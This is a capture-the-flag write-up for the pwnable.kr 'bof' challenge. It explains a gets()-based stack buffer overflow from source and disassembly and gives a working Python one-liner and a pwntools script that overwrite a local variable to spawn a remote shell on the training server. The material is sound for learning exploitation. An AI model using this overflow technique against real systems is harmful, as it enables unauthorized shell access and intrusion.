# bof

pwnable.kr attribution: this challenge comes from <https://pwnable.kr>, and I may reproduce parts of the challenge as visible from there for easier reference.

This is the first level where we don't use `ssh`.

```
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

Downloading `bof.c` gives us

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Our goal (as alluded to by the title and hint) is to exploit this using a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) attack. Note the use of `gets` in the file. `gets` is deprecated and insecure, as the `man` page for `gets(3)` says on my computer:

```
DESCRIPTION
       Never use this function.

       gets()  reads  a  line from stdin into the buffer pointed to by s until
       either a terminating newline or EOF, which it replaces with a null byte
       ('\0').  No check for buffer overrun is performed (see BUGS below).
```

```
BUGS
       Never use gets().  Because it is impossible to tell without knowing the
       data in advance how many characters gets() will read, and because gets()
       will continue to store characters  past  the  end  of the buffer, it is
       extremely dangerous to use.  It has been used to break computer
       security.  Use fgets() instead.

       For more information, see CWE-242 (aka "Use of Inherently Dangerous
       Function") at http://cwe.mitre.org/data/definitions/242.html
```

Now, let's examine the executable to figure out more about the stack layout.

```
$ wget "http://pwnable.kr/bin/bof"  
$ file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```

We have a 32-bit executable, so `key` should appear on the stack right above the return address (on Linux for a 64-bit executable, we'd expect key to be in `%edi`). Looking at the disassembly, e get

```
$ objdump --disassemble=func bof 

bof:     file format elf32-i386


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .text:

0000062c <func>:
 62c:   55                      push   %ebp
 62d:   89 e5                   mov    %esp,%ebp
 62f:   83 ec 48                sub    $0x48,%esp
 632:   65 a1 14 00 00 00       mov    %gs:0x14,%eax
 638:   89 45 f4                mov    %eax,-0xc(%ebp)
 63b:   31 c0                   xor    %eax,%eax
 63d:   c7 04 24 8c 07 00 00    movl   $0x78c,(%esp)
 644:   e8 fc ff ff ff          call   645 <func+0x19>
 649:   8d 45 d4                lea    -0x2c(%ebp),%eax
 64c:   89 04 24                mov    %eax,(%esp)
 64f:   e8 fc ff ff ff          call   650 <func+0x24>
 654:   81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)
 65b:   75 0e                   jne    66b <func+0x3f>
 65d:   c7 04 24 9b 07 00 00    movl   $0x79b,(%esp)
 664:   e8 fc ff ff ff          call   665 <func+0x39>
 669:   eb 0c                   jmp    677 <func+0x4b>
 66b:   c7 04 24 a3 07 00 00    movl   $0x7a3,(%esp)
 672:   e8 fc ff ff ff          call   673 <func+0x47>
 677:   8b 45 f4                mov    -0xc(%ebp),%eax
 67a:   65 33 05 14 00 00 00    xor    %gs:0x14,%eax
 681:   74 05                   je     688 <func+0x5c>
 683:   e8 fc ff ff ff          call   684 <func+0x58>
 688:   c9                      leave
 689:   c3                      ret
```

The important parts of this for the stack layout are

```
 62c:   55                      push   %ebp
 62d:   89 e5                   mov    %esp,%ebp
 62f:   83 ec 48                sub    $0x48,%esp

 649:   8d 45 d4                lea    -0x2c(%ebp),%eax
 64c:   89 04 24                mov    %eax,(%esp)
 64f:   e8 fc ff ff ff          call   650 <func+0x24>

 654:   81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)
```

We know that `%ebp` stores the base pointer for the stack frame (approximately `%esp` on entry). The `lea` tells us that `buf` stats `0x2c` below `%ebp`, and the `cmpl` tells us that `key` is at `0x8` above `%ebp`. So, on `stdin`, we need to put 0x8 + 0x2c = 0x34 (52) of any character followed by `0xcafebabe` (in little-endian order). There are many ways to express this, but a quick "one liner" is

`$ (python3 -c 'import sys; sys.stdout.buffer.write(b"0" * 0x34 + 0xcafebabe.to_bytes(4, "little") + b"\n")'; cat) | nc pwnable.kr 9000`

Some notes:

* We use the `-c` flag of python to run the command we specify without launching a REPL or writing a script.
* We write using `bytes` instead of a string, so we can be very sure of the number of bytes written/encoding used (note that we use `sys.stdout.buffer.write` instead of `print`)
* We use the subshell with `python` and `cat` so that we can interact with the program after the exploit has run (when we should be in the shell (note the call to `execve("/bin/sh")`).
* We include a trailing newline so that the `gets` call terminates.

An equivalent script using [`pwntools`](https://github.com/Gallopsled/pwntools) could look something like

```python3
from pwn import *
context(arch='i386', os='linux')

r = remote('pwnable.kr', 9000)
r.sendline(b"0" * 0x34 + p32(0xcafebabe))
r.interactive()
```

Then, in interactive (note using interactive mode both gives us a shell we can use to look around in and avoids the problem where we'd otherwise have to make sure part of the exploit goes to the `gets` and the other part happens after the `execve`),

```
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls
bof
bof.c
flag
log
super.pl
$ cat flag
```

To expand upon later:

* Disassembly/why look at executable and source code
* Disassemble vs decompile
* Manual decomp
* Full stack frame
* What `%gs:0x14` is/stack canaries
* TCP/sockets/pwntools
